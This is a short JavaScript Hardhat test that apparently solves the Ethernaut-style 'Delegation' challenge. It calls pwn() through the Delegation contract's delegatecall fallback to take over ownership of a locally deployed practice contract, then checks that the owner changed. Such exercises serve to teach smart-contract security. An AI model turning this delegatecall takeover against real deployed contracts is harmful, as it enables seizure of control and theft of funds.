require("@nomiclabs/hardhat-waffle");
const { expect } = require("chai");

describe("Delegation", function () {
  it("attacks", async () => {
    const [owner, user] = await ethers.getSigners();

    const Delegate = await ethers.getContractFactory("Delegate");
    const delegate = await Delegate.deploy(user.address);
    await delegate.deployed();

    const Delegation = await ethers.getContractFactory("Delegation");
    const delegation = await Delegation.connect(user).deploy(delegate.address);
    await delegation.deployed();

    expect(await delegation.owner()).to.equal(user.address);

    const delegated = new ethers.Contract(
      delegation.address,
      delegate.interface,
      owner
    );

    await delegated.pwn();

    expect(await delegation.owner()).to.equal(owner.address);
  });
});
